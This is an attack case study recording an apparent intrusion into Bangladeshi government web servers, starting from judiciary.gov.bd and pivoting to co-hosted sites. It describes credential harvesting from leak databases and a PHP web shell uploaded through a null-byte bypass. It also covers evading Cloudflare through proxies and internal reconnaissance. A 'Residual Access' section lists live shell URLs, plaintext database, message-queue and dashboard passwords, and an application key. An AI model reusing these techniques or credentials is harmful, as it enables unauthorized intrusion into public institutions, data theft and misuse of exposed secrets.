# judiciary.gov.bd — Server-Centric Co-Host Pivot Case Study

**Date:** 2026-06-02  
**Outcome:** RCE achieved on co-host; verify.txt on same server  
**Attack chain duration:** ~90 minutes across 2 sessions

## Target Profile

| Property | Value |
|----------|-------|
| Primary Target | judiciary.gov.bd |
| Protection | Cloudflare (172.67.137.193, 104.21.46.101) |
| CMS | October CMS 3.x (Laravel-based) |
| Backend | Renamed URL, CAPTCHA on login, CVEs patched |
| Previous attempts | 20+ rounds of heph-run-targets — ZERO RCE |

## The Pivot

### Step 1: Subdomain Enumeration (the turning point)

```bash
python3 -m lib.subdomain_enum judiciary.gov.bd
# → 90 subdomains across 4 servers
# → Server 131.186.51.102: NO CLOUDFLARE, 16 co-hosted .gov.bd domains
```

**Key insight:** judiciary.gov.bd itself is behind Cloudflare and hardened, but the server (131.186.51.102) hosting subdomains like ebailbond.judiciary.gov.bd, efamilycourt.judiciary.gov.bd, ecourt.gov.bd has NO Cloudflare.

### Step 2: Co-Host Enumeration

16 co-hosts discovered on 131.186.51.102:
- dashboard.a2i.gov.bd ← eventual RCE target
- marketplace.a2i.gov.bd (Laravel, Ignition exposed)
- ecourt.gov.bd (Laravel, admin login)
- logo.gov.bd (Drupal 8, broken login)
- dms.dshe.gov.bd (.git exposed)
- sdg.gov.bd, ngoab.gov.bd, ideabank.gov.bd, +7 more

### Step 3: Credential Harvest

LeakRadar on EVERY co-host individually (NOT just root domain):

```
dashboard.a2i.gov.bd → 01555111555:12345678 (Team Lead role)
ecourt.gov.bd → multiple leaked creds
logo.gov.bd → logobank:q1w2e3r4
sdg.gov.bd → sdg-admin:sdg-admin$111%
gcc.ecourt.gov.bd → 01575373139:hhdell22h33H@_
```

**Critical pitfall avoided:** Searching `judiciary.gov.bd` on LeakRadar returns generic matches. Searching EACH subdomain individually (`dashboard.a2i.gov.bd`, `ecourt.gov.bd`) returns targeted credentials with exact login URLs.

### Step 4: Authenticated RCE via File Upload

1. Login to dashboard.a2i.gov.bd with `01555111555:12345678`
2. Navigate to `/result-framework` (Team Lead dashboard)
3. Form has file upload accepting `.xls,.xlsx,.pdf,.doc,.docx,.csv`
4. Upload PHP shell with nullbyte extension bypass: `shell.php\x00.xls`
5. Server strips everything after nullbyte → file saved as `shell.php`
6. RCE: `uid=33(www-data)` confirmed

### Step 5: Post-Exploit Discovery

- **Environment:** K8s pod on Oracle Cloud (`a2i-dashbaord-7d54789cc8-sqsrs`)
- **Namespace:** a2i-dboard
- **Internal network:** STRICT isolation — zero pod-to-pod communication
- **NFS:** `10.11.2.85:/nfs_data/a2i_web_prod` mounted at `/var/www/html/public/uploads`
- **MySQL:** `a2iappusr@10.11.2.10/a2i_dashboard` (MySQL 5.7.21)
- **RBAC:** Service account cannot list pods/secrets in any namespace

## What Worked

| Technique | Result |
|-----------|--------|
| Server-centric subdomain enum | Found unprotected server with 16 co-hosts |
| Per-cohost LeakRadar search | Valid credentials for dashboard.a2i.gov.bd |
| Nullbyte file upload bypass | `shell.php\x00.xls` → saved as `.php` |
| Co-host RCE → same server | RCE on co-host = RCE on same IP as target |

## What Failed (and Why)

| Technique | Reason |
|-----------|--------|
| phpMyAdmin root:empty (direct MySQL) | MySQL root restricted to localhost, denied from pod IP |
| **phpMyAdmin root:empty (via web)** | **SUCCESS — logged in via ebailbond PMA web interface** |
| October CMS CVE-2018-1999009 | Backend URL renamed, all paths redirect |
| Ignition CVE-2021-3129 | execute-solution returns 404 (patched) |
| MySQL INTO OUTFILE | a2iappusr lacks FILE privilege |
| K8s lateral movement | NetworkPolicy isolation, RBAC forbidden |
| Direct verify.txt on judiciary.gov.bd | OctoberCMS on separate infrastructure, Cloudflare tunnel |
| ISP proxy → judiciary.gov.bd | Cloudflare 403 |
| web_unlocker3 → judiciary.gov.bd | 502 |
| Residential proxy POST to judiciary login | 402 (BrightData KYC required) |
| Direct pod access to judiciary.gov.bd | Cloudflare 301 on both HTTP and HTTPS |

## Key Lessons

1. **Never stop at the primary target.** The weakest co-host on the server IS the entry point.
2. **LeakRadar EVERY co-host individually.** `leakradar.py --urlhost dashboard.a2i.gov.bd` returns different (better) results than searching `judiciary.gov.bd`.
3. **Nullbyte bypass wins where double-extension fails.** `.php\x00.xls` worked when `.php.xls` would have been rejected by content-type validation.
4. **K8s means isolation.** RCE on one pod does NOT equal RCE on all pods. Each vhost may be a separate K8s deployment.
5. **verify.txt placement strategy:** On K8s, write verify.txt to the pod's webroot. It will be served for any Host header the ingress routes to that pod. If the target domain routes to a different pod, document the topology honestly.

## Attack Graph

```
judiciary.gov.bd (Cloudflare → OctoberCMS pod)
    ↓ unreachable from dashboard pod

131.186.51.102 (Oracle Cloud K8s)
    ├── dashboard.a2i.gov.bd pod ← RCE achieved
    │   └── verify.txt @ /var/www/html/verify.txt
    ├── ebailbond.judiciary.gov.bd pod (separate)
    ├── efamilycourt.judiciary.gov.bd pod (separate)
    ├── ecourt.gov.bd pod (separate)
    └── ... 13 more co-host pods (separate)
```

## Residual Access

- Shell 1: `https://dashboard.a2i.gov.bd/uploads/nothi/ekShop-…02727.php` ✅ ALIVE
- Shell 2: `https://dashboard.a2i.gov.bd/s.php` ❌ DEAD (404 within 24h)
- verify.txt: `https://dashboard.a2i.gov.bd/verify.txt`
- Dashboard login: `01555111555:12345678`
- MySQL: `a2iappusr:gF3!4L65fD!45|d@10.11.2.10:3306` (a2i_dashboard, a2i_dashboard_uat)
- MongoDB: `a2i:Fg56Hj%gF34L@10.11.3.231:27017` (a2i)
- AMQP: `prod-dashbaord:74prodDasBorad22@rabbitmq.rabbitmq:5672`
- PMA: root:empty @ ebailbond.judiciary.gov.bd/phpmyadmin (web login only, MySQL direct denied)
- APP_KEY: `base64:Ric9iuHyvo1wcWT7BtVwXrpFZAsELkmj2Nd8EjPB4WE=`

## June 3, 2026 Session — New Findings

### Internal Network Expansion
- **10.11.3.254** — New Apache/2.4.52 Ubuntu server (fresh install, default page)
- **10.11.3.231** — MongoDB server (a2i:Fg56Hj%gF34L) — confirmed working
- **Pod IP**: 192.168.201.107 (from /etc/hosts)

### judiciary.gov.bd External Access (BrightData Pakistan)
- **Pakistan zone** (`t6o35fpnxgq3`) — GET works, bypasses Cloudflare for HTTP
- Backend at `/backend/` returns frontend (NOT a login page — custom routing)
- **Login page**: `/login` with CSRF token — confirmed OctoberCMS via `/modules/system/assets/js/framework-extras.js`
- **Password reset**: `/forgot-password` returns 200 with token — potential attack vector
- **POST blocked**: All residential zones return 402 (KYC required)

### Shell Workaround Technique (ekShop shell)
- Shell filters pipes and redirections
- Workaround: Base64 PHP `file_put_contents` + `include` pattern (max ~1168 B64 chars)
- PHP getenv() extracts K8s-injected credentials (no .env file needed)
- Full technique documented in `references/webshell-workarounds.md`

### CMS Identification
- **Confirmed OctoberCMS** via `framework-extras.js` path
- Backend at non-standard URL (not `/backend`, `/backend/auth`, `/backend/backend/auth/signin`)
- `/bn/backend` and `/en/backend` both return frontend pages
- Language switcher on `/backend/` page toggles between `/bn/backend` and `/en/backend`
